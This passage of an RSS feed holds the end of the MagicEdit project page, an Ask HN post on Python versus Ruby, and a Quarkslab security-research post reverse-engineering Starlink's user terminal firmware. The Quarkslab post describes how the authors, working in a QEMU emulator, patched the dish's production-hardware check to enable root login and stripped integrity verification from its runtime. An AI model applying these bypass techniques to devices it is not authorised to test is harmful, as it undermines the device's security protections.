        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td><b>Prompt</b> = "a handsome man, jogging, on the road, trees, sunny"</td>
          <td></td>
          <td><b>Prompt</b> + "long pants"</td>
        </tr>
      </tbody></table>
    </center>
  </div>


</div>

<div id="BibTeX">
    <h2>BibTeX</h2>
    <pre><code>@inproceedings{liew2023magicedit,
    author = {Liew, Jun Hao and Yan, Hanshu and Zhang, Jianfeng and Xu, Zhongcong and Feng, Jiashi},
    title = {MagicEdit: High-Fidelity and Temporally Coherent Video Editing},
    booktitle={arXiv},
    year = {2023}
}</code></pre>
  </div>


<!-- <footer class="footer">
  <div class="container">
    <div class="content has-text-centered">
      <a class="icon-link" href="">
        <i class="fas fa-file-pdf"></i>
      </a>
      <a class="icon-link" href="" class="external-link" disabled>
        <i class="fab fa-github"></i>
      </a>
    </div>
    <div class="columns is-centered">
      <div class="column is-6">
        <div class="content">
          <p>
             The source code of this webpage is based on the <a href="https://github.com/nerfies/nerfies.github.io/"> Nerfies</a> project webpage.
          </p>
        </div>
      </div>
    </div>
  </div>
</footer> -->





</div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Why did Python win? (417 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=37308747</link>
            <guid>37308747</guid>
            <pubDate>Tue, 29 Aug 2023 14:48:20 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=37308747">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="37308747">
      <td><span></span></td>      <td><center><a id="up_37308747" href="https://news.ycombinator.com/vote?id=37308747&amp;how=up&amp;goto=item%3Fid%3D37308747"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=37308747">Ask HN: Why did Python win?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_37308747">138 points</span> by <a href="https://news.ycombinator.com/user?id=MatthiasPortzel">MatthiasPortzel</a> <span title="2023-08-29T14:48:20"><a href="https://news.ycombinator.com/item?id=37308747">7 hours ago</a></span> <span id="unv_37308747"></span> | <a href="https://news.ycombinator.com/hide?id=37308747&amp;goto=item%3Fid%3D37308747">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Why%20did%20Python%20win%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=37308747&amp;auth=3b729daf9e037e91bacc1b8d62e74da7bbc9e16c">favorite</a> | <a href="https://news.ycombinator.com/item?id=37308747">276&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>I started programming in ~2013 in JavaScript. I’ve since learned and tried a handful of languages, including Python, but JavaScript was always my favorite. Just within the last year I learned Ruby, and I was blown away by how fun and easy to use it is. At the present time, I’m starting all my new projects in Ruby.</p><p>My impression is that in the ‘00s, Python and Ruby were both relatively new, dynamically typed, “English-like” languages. And for a while these languages had similar popularity.</p><p>Now Ruby is still very much alive; there are plenty of Rails jobs available and exciting things happening with Ruby itself. But Python has become a titan in the last ten years. It has continued to grow exponentially and Ruby has not.</p><p>I can guess as to why (Python’s math libraries, numpy and pandas make it appealing to academics; Python is simpler and possibly easier to learn; Rails was so popular that it was synonymous with Ruby) but I wasn’t paying attention at that time. So I’m interested in hearing from some of the older programmers about why Ruby has stalled out and Python has become possibly the most popular programming language (when, in my opinion, Ruby is the better language).</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
</td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Starlink's User Terminal Firmware (190 pts)]]></title>
            <link>https://blog.quarkslab.com/starlink.html</link>
            <guid>37308405</guid>
            <pubDate>Tue, 29 Aug 2023 14:24:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.quarkslab.com/starlink.html">https://blog.quarkslab.com/starlink.html</a>, See on <a href="https://news.ycombinator.com/item?id=37308405">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  

  <p>This blog post presents an overview of Starlink's User Terminal runtime internals, focusing on the communications that happen within the device and with user applications and some tools that can help further research on the same topic.</p>

  

<h2>Introduction</h2>
<p>Starlink is a satellite-based Internet access service provided by Space X. This service already counts more than <a href="https://twitter.com/Starlink/status/1654673695007457280">1.5 million subscribers</a> all around the world, using the very same infrastructure. Starlink relies on 3 components:</p>
<ul>
<li>A user terminal, which communicates with the satellites, and on which most of the current research is focused.</li>
<li>A satellite fleet acting as a mesh network.</li>
<li>A gateway that connects the satellites to the internet.</li>
</ul>
<p>Numerous studies [<a href="https://radionavlab.ae.utexas.edu/wp-content/uploads/2023/01/starlink_structure.pdf">1</a>, <a href="https://www.esat.kuleuven.be/cosic/blog/dumping-and-extracting-the-spacex-starlink-user-terminal-firmware/">2</a>, <a href="https://github.com/KULeuven-COSIC/Starlink-FI">3</a>] have already been conducted on the subject, mainly on the user terminal.
During my 6-month internship at <a href="https://www.quarkslab.com/">Quarkslab</a> as part of my Master's degree program at the <a href="https://www.unitn.it/en">University of Trento</a>, I carried out the analysis of Starlink by reverse-engineering its firmware and the various protocols it uses.
At the end of the internship, I gained a good knowledge of how the device works internally and developed a set of tools that could help other researchers working on the same topic.
These tools will be described and published along with this blog post.</p>
<p>To conduct this study, we analyzed two regular User Terminals version 2 (the round one) and a User Terminal version 3 (the squared one) with root access (researcher access) which was provided by SpaceX's security team toward the end of my internship.</p>
<h2>Firmware overview</h2>
<p>The first step was to dump the firmware of the device since it's not publicly available, and we did that thanks to a <a href="https://www.esat.kuleuven.be/cosic/blog/dumping-and-extracting-the-spacex-starlink-user-terminal-firmware/">blog post</a> by the <a href="https://www.esat.kuleuven.be/cosic/">COSIC</a> research group at KU Leuven.
Once we got the firmware, we started inspecting the content, trying to understand how the memory was structured.
We also started looking into the U-Boot version that was customized by SpaceX, and it is being used as the final bootloader stage (BL33) for the User Terminal.
The U-Boot license requires any modification of its code to be published with the same license, hence you can find it on <a href="https://github.com/SpaceExplorationTechnologies/u-boot">GitHub</a>.</p>
<p>From the file <a href="https://github.com/SpaceExplorationTechnologies/u-boot/blob/sx_2022_05_03/include/configs/spacex_catson_boot.h"><code>include/configs/spacex_catson_boot.h</code></a> we can see how the memory is partitioned, here is a part of it:</p>
<div><pre><span></span><code><span>+-----------------+</span><span> 0x0000_0000</span>
<span>| bootfip0 (1 MB) |</span>
<span>+-----------------+</span><span> 0x0010_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>+-----------------+</span><span> 0x0060_0000</span>
<span>| fip  a</span><span>.</span><span>0 (1 MB) |</span>
<span>+-----------------+</span><span> 0x0070_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>+-----------------+</span><span> 0x0100_0000</span>
<span>| linux a (32 MB) |</span>
<span>+-----------------+</span><span> 0x0300_0000</span>
<span>| linux b (32 MB) |</span>
<span>+-----------------+</span><span> 0x0500_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
</code></pre></div>

<p>This allows us to split the image into small partitions and analyze each of them separately.
<a href="https://github.com/quarkslab/starlink-tools/tree/main/parts-extractor">This script</a> can help you do that automatically.
From here, we can also see that almost every partition is present multiple times (e.g. <code>linux a/b</code>).
This is because of the software update procedure, which will overwrite the partition that is not currently being used so that in the case of an error, there will still be the original partition that is known to be "correct".
An overview of the main partitions can be seen in the following picture.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/partitions.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/partitions.png" width="80%">
    </a>
</center>
<p>Partitions <code>Boot FIP</code> and <code>FIP</code> contain all the bootloader stages that compose the secure boot chain, most of them are based on the <a href="https://www.trustedfirmware.org/projects/tf-a/">ARM TF-A project</a>, which does not come with a GNU-like license, and the last one (BL33) is the U-Boot bootloader we mentioned above.</p>
<p>Having a clear idea of the boot process is essential to perform the <a href="https://github.com/KULeuven-COSIC/Starlink-FI">fault injection attack</a> developed by the COSIC research group.
The boot chain follows the classic multi-stage secure boot implemented by ARM TF-A, in the following picture you can see an overview of it.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/boot-chain.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/boot-chain.png" width="100%">
    </a>
</center>
<p>Boot stages come from different partitions of the eMMC and the first, which represents the Root of Trust, comes from an internal ROM of the main processor, they can be extracted from the partition images by using <a href="https://github.com/ARM-software/arm-trusted-firmware/tree/master/tools/fiptool">fiptool</a>, from ARM TF-A.
At the end of the boot process, BL31 will reside in Exception Level 3 (EL3) and act as a secure monitor, while the Linux kernel will run in Exception Level 1 (EL1), in the normal world running user-land applications in Exception Level 0 (EL0).</p>
<p>Then, the <code>linux</code> partition, as the name suggests, contains the Linux kernel, its ramdisk image and some Flattened Device Trees, one for every hardware version of the User Terminal.
This partition can be unpacked by using <a href="https://github.com/u-boot/u-boot/blob/master/tools/dumpimage.c">dumpimage</a> from the U-Boot project, the ramdisk is a <code>cpio</code> image and FDTs come in the form of Device Tree Blobs (DTBs) which can be "decompiled" to Device Tree Sources (DTSs) text with the <a href="https://elinux.org/Device_Tree_Reference">Device Tree Compiler</a>.
This partition also comes with some Error Correcting Code (ECC) information in it, you will need to remove it before being able to unpack it.
The ECC mechanism is custom-made by SpaceX and you can understand how it works by looking at the code in U-Boot which handles this verification, the next <a href="#integrity">Section</a> explains how it works and provides a tool to do that.</p>
<p>The <code>sx</code> (SX Runtime) partition contains configuration files and binaries that are specific to the User Terminal.
This partition will be mounted by the Linux's init script on <code>/sx/local/runtime</code> and after that binaries in this volume will be started.
In this case, integrity verification is done with <code>sxverity</code> which is yet another custom tool by SpaceX.
The next section will explain how this works.</p>
<p>Other partitions include some encrypted ones, using the Linux Unified Key System (LUKS), which are the only ones with the write permission, and some other smaller partitions that are not worth mentioning.</p>
<h2><a name="integrity"></a>Data integrity</h2>
<p>As we have seen from a brief analysis of the content of the eMMC dump, SpaceX is using some custom-made mechanisms for data integrity, along with the standard ones already included in ARM TF-A and U-Boot. Here is an overview of the custom-made components.</p>
<h3>ECC</h3>
<p>The Error Correcting code mechanism is only used in the FIT image and only provides data integrity, without considering authenticity. This means that, in theory, you can tamper with some ECC-protected components of the dish if you provide correctly formatted data using your own implementation of the <code>ecc</code> procedure (or using the binary found in the ramdisk). But for the FIT image, this is not possible because authenticity is also checked by the last bootloader stage.
So this is just used to prevent errors in the eMMC storage.</p>
<p>This works similarly to its original ancestor, the ECC RAM, which embeds some additional data in between the actual content of the memory - originally Hamming codes - that are computed as a function of the data they are "protecting".
Then, when some data is accessed, Hamming codes are recomputed and if they do not correspond to the ones saved in memory, an error occurred, and depending on how many bits have been mistakenly flipped, the error can be corrected.
This version of ECC uses Reed-Solomon error correction (instead of Hamming codes) and a final hash (i.e. MD5) to check the integrity of the whole file that is being decoded.</p>
<p><a href="https://github.com/quarkslab/starlink-tools/tree/main/unecc">Here</a> you can find a simple Python script that strips out ECC information from a file, without checking the correctness of the data, that we used to be able to unpack the FIT image. Inside the ramdisk, there is a binary (<code>unecc</code>) that does the same thing also checking and trying to correct possible errors.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/ecc.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/ecc.png" width="100%">
    </a>
</center>
<p>The content of ECC-protected files is organized into blocks of different types, the above figure shows how each block is structured.
The file starts with a header block (a), which contains the magic number and the version of the protocol, along with some data and the corresponding control codes.
Then, there can be zero or more data blocks (b) containing just data and control codes.
A last data block (c), which is recognized by its block type field (<code>$</code>, instead of <code>*</code>), marks the end of the payload, some padding is added here if needed.
Finally, the footer block (d) contains the size of the payload (needed to know the number of padding bytes), an MD5 checksum of the whole payload and, of course, ECC code words for the footer block itself.</p>
<h3>sxverity</h3>
<p><code>sxverity</code> is a custom wrapper for the device-mapper-verity (dm-verity) kernel feature, which provides transparent integrity checking of block devices.
The source code of the tool is not publicly available, thus we had to reverse the compiled binary to understand the internals.
This provides both data integrity and authenticity thanks to a signature check that verifies the whole content of the device.
<code>sxverity</code> internally uses the dm-verity kernel feature, by directly interacting with it through the <code>/dev/mapper/control</code> device.</p>
<p>SpaceX only tackled the verification of the root hash, everything underneath, which is handled by the kernel, has not been reimplemented, a nice explanation of how this works can be found <a href="https://source.android.com/docs/security/features/verifiedboot/dm-verity">here</a>.</p>
<p>As we have seen in previous sections, <code>sxverity</code> is used to verify some of the partitions that reside in the persistent memory, this is to prevent persistent exploits.
But as we'll see in the next sections, it is also used to verify software updates for the dish. Thus, it is a critical component for the overall security of the device.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity-header.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity-header.png" width="40%">
    </a>
</center>
<p>In the picture above you can see the structure of a <code>sxverity</code> image.
It is composed of a header, that is repeated 4 times, possibly signed with different public keys, which contains:</p>
<ul>
<li>The magic bytes <code>"sxverity"</code>.</li>
<li>The version and some flags indicating which algorithms have been used for signing and hashing.</li>
<li>The root hash, which indirectly covers the whole payload (through the hash tree).</li>
<li>The public key that has been used to sign the image.</li>
<li>The signature of all the fields above, using an elliptic curve (ED25519).</li>
</ul>
<p>The parsing and verification procedure performed by this process will be described in the <a href="#fuzzing">Fuzzing</a> section.</p>
<h2>Runtime overview</h2>
<p>In this section, we will discuss what happens after the bootloader chain, starting from the Linux's init script to the processes that handle the runtime of the User Terminal.</p>
<p>The <code>init</code> script is the first process started by the kernel and usually has a process identifier (PID) equal to 1.
Its main task is to start all the other runtime processes needed for the system to be useful, and remains running until the system is shut down. It will be the "oldest" ancestor of any other process and it is also used by the user to start, stop and configure daemons once the system is up and running.
The most common init script you can find in an end-user Linux distribution is <code>systemd</code>, which is a collection of tools to manage the whole runtime of the system (e.g. <code>systemctl</code>), among which there is also the <code>init</code> script.</p>
<p>SpaceX's people like to implement their own software, so they implemented their own init script, which can be found in the ramdisk, at <code>/usr/sbin/sxruntime_start</code>. This uses a custom formatted configuration file that contains the instructions of which processes to start, how to start them and in which order.</p>
<div><pre><span></span><code><span>#######################################</span>
<span># user terminal frontend</span>
<span>#</span>
<span># Wait until dish config partition is set up before launching.</span>
<span>#######################################</span>
proc            user_terminal_frontend
apparmor        user_terminal_frontend
start_if        <span>$(</span>cat /proc/device-tree/model<span>)</span> !<span>=</span> <span>'spacex_satellite_starlink_transceiver'</span>
startup_flags   wait_on_barrier
user            sx_packet
custom_param    --log_wrapped
</code></pre></div>

<p>The snippet above shows how a process called <code>user_terminal_frontend</code> is started:</p>
<ul>
<li>It is started only if the condition <code>$(cat /proc/device-tree/model) != 'spacex_satellite_starlink_transceiver'</code> is satisfied.</li>
<li>It is started after the last process marked with the <code>barrier</code> flag has exited.</li>
<li>It is executed as the Linux user <code>sx_packet</code>.</li>
<li>The command line parameter <code>--log_wrapped</code> is passed to it.</li>
</ul>
<p>The two configuration files that are parsed by the init script can be found at <code>/etc/runtime_init</code> (ramdisk) and <code>/sx/local/runtime/dat/common/runtime</code> (runtime image).
The first one handles system-level services and configurations, such as mounting partitions (e.g. the runtime), and setting up the network, the console and the logger service.
The second one, instead, handles more high-level processes and configurations, such as starting all the processes contained in the runtime image and initializing encrypted devices.</p>
<p>Additionally, the init script also assigns priorities and specific CPU cores to those processes, by following some rules listed in another configuration file, that can be found at <code>/sx/local/runtime/dat/common/runtime_priorities</code>.</p>
<h3>File system &amp; mount points</h3>
<p>First of all, the root filesystem is copied in RAM by the last bootloader (U-Boot, BL33), and is mounted at <code>/</code>.
Partitions of the eMMC can be accessed by the system through the files <code>/dev/blk/mmcblk0pN</code> where <code>mmcblk0</code> is the name of the eMMC and <code>N</code> is the partition index, starting from 1.
For convenience, a script will then create some symbolic links to these partitions to use a more explicit name, as shown below.</p>
<div><pre><span></span><code><span># [...]</span>
ln -s /dev/mmcblk0p1 /dev/blk/bootfip0
ln -s /dev/mmcblk0p2 /dev/blk/bootfip1
ln -s /dev/mmcblk0p3 /dev/blk/bootfip2
ln -s /dev/mmcblk0p4 /dev/blk/bootfip3
<span># [...]</span>
</code></pre></div>

<p>Since almost every partition is duplicated, another script will then create additional links in the folders <code>/dev/blk/current</code> and <code>/dev/blk/other</code>, the first one containing the partitions that are currently being used by the system and second one containing the other ones, that will be used in case of a software update.
The system knows which partitions have been used for the current boot by looking in <code>/proc/device-tree/chosen/linux_boot_slot</code> which is populated by the bootloader.</p>
<p>Then, the <code>runtime</code> partition is unpacked using <code>sxverity</code> and the content is extracted to <code>/sx/local/runtime</code>.
This partition contains two folders:</p>
<ul>
<li><code>bin</code> contains binaries and executable scripts.</li>
<li><code>dat</code> contains a lot of additional data like AppArmor rules, hardware-specific configurations and generic configuration files, such as <code>dat/common/runtime</code> which is the (second) configuration file used by the init script.</li>
</ul>
<p>After these operations, the root filesystem is remounted with the <code>ro</code> (read-only) flag.
Additional partitions are then mounted, such as:</p>
<ul>
<li><code>/dev/blk/current/version_info</code> on <code>/mnt/version_info</code> (through <code>sxverity</code>).</li>
<li><code>/dev/blk/dish_cfg</code> on <code>/mnt/dish_cfg</code> (through <code>LUKS</code>).</li>
<li><code>/dev/blk/edr</code> on <code>/mnt/edr</code> (through <code>LUKS</code>).</li>
</ul>
<h3>Daemons</h3>
<p>After the elaborate boot procedure and system configuration we finally reach a state in which some processes are running, each one with a unique task, to provide the user with the service the device is built for, i.e. a satellite internet connection.
As you may have guessed, many things happen in the background to ensure a stable enough internet connection such as sending and receiving traffic to and from satellites, choosing which satellite to connect to, changing satellite (without disrupting the Internet connection) when the current one moved too far, handling user requests coming from the mobile application, etc.
Furthermore, these processes need to communicate continuously with each other to synchronize and cooperate, and with Starlink's cloud services for backend functionalities.</p>
<p>Most of the binaries have been implemented in C++ and some of them are also statically linked.
Due to this, it was challenging to reverse-engineer these binaries and due to time constraints, we were unable to fully comprehend all of them.
Some work was done to identify statically linked library functions, using the binary diffing technique.
It is also probable that these programs were implemented using the <a href="https://www.scribd.com/document/68990784/B31-full">State Machine Design Pattern</a>, which makes heavy use of features of Object Oriented Programming such as multiple inheritance, virtual methods and generic types.
This made the reverse-engineering process even more difficult due to the complex structures that are produced by the compiler when using these features.</p>
<p>We tried to compare the network stack of the User Terminal with the known ISO-OSI stack, and the following could be a proper mapping:</p>
<ul>
<li><code>phyfw</code> (Physical Firmware, perhaps) handles the physical layer of the satellite communication, which includes modulation/demodulation of RF signals.</li>
<li><code>rx_lmac</code> and <code>tx_lmac</code> (rx/tx lower Medium Access Control, perhaps) fall in the data link layer, and handle the physical access to the medium, separately for receiving and transmitting.</li>
<li><code>umac</code> (upper Medium Access Control, perhaps), could represent the network layer. It handles the access to the medium, at a higher level, and coordinates between the transmission and reception of frames. It may also be in charge of choosing which satellite to connect to.</li>
<li><code>connection_manager</code> could represent the transport layer and, if it's the case, it handles stateful connections between the dish and satellites, in which the traffic will be exchanged.</li>
<li><code>ut_packet_pipeline</code> is probably used to create an encrypted tunnel in which user traffic will be exchanged using the secure element on the dish for handshakes. This could be associated with the known protocols such as TLS, DTLS, IPsec or, again, a custom one.</li>
</ul>
<p>Other than these network-related processes there also are some processes that handle system telemetry, software updates, system health status and outage detection/reporting and finally a "control" process that acts as an orchestrator for all the other processes.</p>
<p>On the other hand, one of the binaries, namely <code>user_terminal_frontend</code>, is implemented in Go, an open-source (compiled) programming language from Google.
Go binaries are statically linked and they include the go runtime, so they are pretty big, but luckily they also include symbols that are used by the runtime for comprehensive runtime error reporting, which includes function names, source code line numbers and data structures.
All this precious information can be recovered using a plugin for Ghidra called <a href="https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension">GolangAnalyzer</a> which was quite effective.
The extension also recovers complex data types and creates the corresponding C-like structures in Ghidra, which is extremely useful when working with an OOP language.
Additional manual analysis is needed because of the custom calling convention used by Go, but after this, the resulting disassembled C code is easily readable.
Our primary focus was on the runtime's higher-level components, which include this process.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/architecture.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/architecture.png" width="100%">
    </a>
</center>
<p>To summarize this section, in the picture above you can see a sketch of the architecture of the runtime (not complete), in which you can see that processes at the bottom, "closer" to the hardware, are statically linked, probably for performance reasons, and communicate only with the control process, while the other ones also communicate with Starlink's cloud services, through gRPC.
In section <a href="#communications">Communications</a>, we will tackle all the communications shown by this picture in more detail.
And finally, there is the go binary (which is technically statically linked as well, but just because of the language constraint), which communicates with frontend applications used by the user.</p>
<h2>Runtime emulation</h2>
<p>Due to the negative results of our Fault injection attack, we didn't have access to a live device on which to check our findings or perform some dynamic analysis.
Thus, we tried to set up an emulated environment, as similar as possible to the real device, that would be capable of executing runtime binaries.
We are emulating the entire system (full-system emulation), starting from the kernel, using QEMU as an emulator engine.
In the following paragraphs we describe every challenge we had to deal with, including the ones we couldn't solve, while setting up the environment and the final result.</p>
<p>The first choice to be made is which hardware we want QEMU to emulate.
When you want to emulate an IoT device using QEMU you usually look for the hardware implementation of the particular device for QEMU, which is usually available for common, off-the-shelf devices such as Arduino, Raspberry Pi, and less-known boards as well.
The hardware implementation of our device was, of course, not available, so we used the <code>(aarch64) virt</code> machine, which is the most generic one.
The proper way to emulate the whole device would have been to construct this machine specification for QEMU, as well as implement emulators for every piece of hardware that is present on the board.
The problem is that most of the peripherals present on the device are not open hardware, and even if they were, implementing all of them in QEMU would have been a lot of work.
Instead, using the <code>virt</code> machine and tweaking the Device Tree is much easier, at the cost of not having most of the hardware peripherals and thus some limitations.</p>
<p>Another problem was the choice of the kernel to run in QEMU.
We tried with the original one, extracted from the FIT of the firmware, but that didn't work in the emulated environment. So we decided to compile one ourselves.
Unfortunately, the open-source version of Linux published by SpaceX is 5.10.90, while the one found on the dish was 5.15.55, so we used the mainstream Linux kernel.
A lot of tweaks in the compile-time configuration had to be made for it to boot, some of them required by QEMU and some of them required by Starlink's software.
It is possible to extract this configuration from a compiled Kernel image, using the script <code>extract-ikconfig</code> from the Linux kernel repository, which was used to find differences between the default one and the one configured by SpaceX.</p>
<p>The device tree not only contains information about hardware peripherals but also data that is used by the runtime, such as public keys used by <code>sxverity</code>.
Additionally, the U-Boot bootloader also populates the FDT before booting the Linux kernel, by adding, for example, which set of partitions have been used in the current boot, the name of the main network interface and more.
All this information is of course not included in the FDT set by QEMU for the <code>virt</code> machine, thus we extracted this FDT, using the <code>dumpdtb</code> flag, and added the missing information, as shown below, which can then be recompiled using the Device Tree compiler (<code>dtc</code>) and given to QEMU using the <code>-dtb</code> flag.</p>
<div><pre><span></span><code><span># ...</span>
<span>model</span> <span>=</span> <span>"spacex_satellite_user_terminal"</span><span>;</span>
<span>compatible</span> <span>=</span> <span>"st,gllcff"</span><span>;</span>

chosen <span>{</span>
    <span>linux_boot_slot</span> <span>=</span> <span>"0"</span><span>;</span>
    <span>ethprime</span> <span>=</span> <span>"eth_user"</span><span>;</span>
    <span>board_revision</span> <span>=</span> <span>"rev2_proto3"</span><span>;</span>
    <span>bootfip_slot</span> <span>=</span> &lt;0x00&gt;<span>;</span>
    <span>boot_slot</span> <span>=</span> &lt;0x0006&gt;<span>;</span>
    <span>boot_count</span> <span>=</span> &lt;0x0010&gt;<span>;</span>
    <span># ...</span>
<span>}</span><span>;</span>

security <span>{</span>
    dm-verity-pubkey <span>=</span> &lt;REDACTED&gt;<span>;</span>
    <span># ...</span>
<span>}</span><span>;</span>
<span># ...</span>
</code></pre></div>

<p>As the root filesystem, we used the one we extracted from the dish, with some modifications.</p>
<ul>
<li>Since we want to have access to the emulated dish, it must think it is a development version so that password access is enabled, thus we patched the <code>is_production_hardware</code> script. This could have been done in multiple ways, such as directly editing the <code>/etc/shadow</code> file, or adding our public key to the SSH's <code>authorized_users</code> files, but what we did is more effective because emulating development hardware will also enable other debugging features.</li>
<li>We also included the extracted runtime where it would have been mounted and removed the integrity verification and mounting step from the <code>/etc/runtime_init</code> file to be able to also tamper with the contents of that partition.</li>
<li>In the <code>/etc/runtime_init</code> file we also added some custom steps, for example, one that sets up our emulated network, and one that mounts read-write partitions as emulated volumes.</li>
</ul>
<p>Additional patches will be needed for other programs to start in the emulated environment.
We have also included some additional software that will be used for testing purposes such as <code>gdbserver</code>. But for these programs to be able to run, we either had to cross-compile them using the same build toolchain, or cross-compile them statically.</p>
<p>Even though both the root filesystem and the runtime are already placed in memory when the Linux kernel boots, a lot of processes directly access some partitions of the eMMC.
So we've also instructed QEMU to create a raw virtual block device, containing the original image dumped from the physical board.
However, since it is not seen by the kernel as an eMMC chip, the assigned name is different from the one assigned by the physical device.
Because of this, we had to change every reference to <code>mmcblk0</code> to <code>vda</code>, which is the name assigned by the kernel in the emulator.
Fortunately, as we saw in the previous section, the device only uses the name of the device in a script that creates some symbolic links to every partition, so we just had to patch that script and the command line argument for the kernel.
Partitions that are mounted with write permission, are instead mapped to a folder on the host so that it is possible to inspect their content afterward.</p>
<p>As for the network, it is not necessary to replicate the exact network configuration of the dish (as it is not very clear to us), we just need to have the right interface names and internet access.
This was done by using a tap interface, bridged to the host which acts as a NAT gateway, as shown in the following scripts.</p>
<p>Host:</p>
<div><pre><span></span><code><span>#!/bin/bash</span>

ifconfig <span>$1</span> <span>0</span>.0.0.0 promisc up
brctl addbr virbr0
brctl addif virbr0 <span>$1</span>

ip link <span>set</span> dev virbr0 up
ip link <span>set</span> dev <span>$1</span> up

ip addr add <span>192</span>.168.100.2/24 dev virbr0
<span>echo</span> <span>1</span> &gt; /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
</code></pre></div>

<p>Guest:</p>
<div><pre><span></span><code><span>#!/bin/sh</span>

ip link <span>set</span> dev eth0 name eth_user
ip link <span>set</span> dev eth_user up
ip addr add <span>192</span>.168.100.1/24 dev eth_user

route add -net <span>0</span>.0.0.0 netmask <span>0</span>.0.0.0 gw <span>192</span>.168.100.2 dev eth_user
</code></pre></div>

<h3>Emulation Results</h3>
<p>As explained in previous sections, most of the hardware is not present in the emulated environment, so every component that tries to use it will fail.
Lower-level processes, such as <code>phyfw</code> and <code>[rx/tx]_lmac</code>, whose main task is to interact with Starlink's hardware won't work in this environment.
But also other binaries require some hardware to be present, the most common one is the secure element, which is used in most of the cryptographic exchanges.
So for those binaries to work we patched every instruction that would make the program crash, but if the hardware is required for substantial parts of the process, this solution is pointless.
In the end, we managed to emulate, among the main processes discussed in the Daemons subsection, only <code>user_terminal_frontend</code>, <code>starlink_software_update</code>, <code>umac</code> and the ones related to telemetry, along with smaller processes.
Further work on this topic could incrementally add support for some peripherals of the board, hence being able to emulate more and more processes.
Here you can see the console output of the final phase of the boot process in the emulated environment.</p>
<div><pre><span></span><code><span># [...]</span><span></span>
<span># kernel messages and (a lot of) errors from applications</span><span></span>
<span># trying to access missing hardware peripherals</span><span></span>
<span># [...]</span><span></span>

<span>setup_console</span><span>:</span><span> </span><span>Development</span><span> </span><span>login</span><span> </span><span>enabled</span><span>:</span><span> </span><span>yes</span><span></span>

<span>SpaceX</span><span> </span><span>User</span><span> </span><span>Terminal</span><span>.</span><span></span>
<span>user1</span><span> </span><span>login</span><span>:</span><span> </span><span>root</span><span></span>
<span>Password</span><span>:</span><span> </span>

<span>                                                                </span><span>*</span><span></span>
<span>                                                 </span><span>+</span><span>               </span>
<span>                                       </span><span>+</span><span>    </span><span>+</span><span>                    </span>
<span>                                </span><span>+</span><span>     </span><span>+</span><span>                          </span>
<span>                           </span><span>+</span><span>      </span><span>+</span><span>                              </span>
<span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>              </span><span>+</span><span>     </span><span>+</span><span>                                   </span>
<span>  </span><span>+</span><span>        </span><span>+</span><span>       </span><span>+</span><span>     </span><span>+</span><span>                                       </span>
<span>     </span><span>+</span><span>       </span><span>+</span><span> </span><span>+</span><span>      </span><span>+</span><span>                                          </span>
<span>        </span><span>+</span><span>   </span><span>+</span><span>      </span><span>+</span><span>                                             </span>
<span>          </span><span>+</span><span>      </span><span>+</span><span> </span><span>+</span><span>                                             </span>
<span>      </span><span>+</span><span>      </span><span>+</span><span>        </span><span>+</span><span>                                          </span>
<span>   </span><span>+</span><span>       </span><span>+</span><span>    </span><span>+</span><span>        </span><span>+</span><span>                                       </span>
<span> </span><span>+</span><span>       </span><span>+</span><span>         </span><span>+</span><span>        </span><span>+</span><span>                                    </span>
<span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>             </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>                                </span>


<span>The</span><span> </span><span>Flight</span><span> </span><span>Software</span><span> </span><span>does</span><span> </span><span>not</span><span> </span><span>log</span><span> </span><span>to</span><span> </span><span>the</span><span> </span><span>console</span><span>.</span><span> </span><span>If</span><span> </span><span>you</span><span> </span><span>wish</span><span> </span><span>to</span><span> </span><span>view</span><span></span>
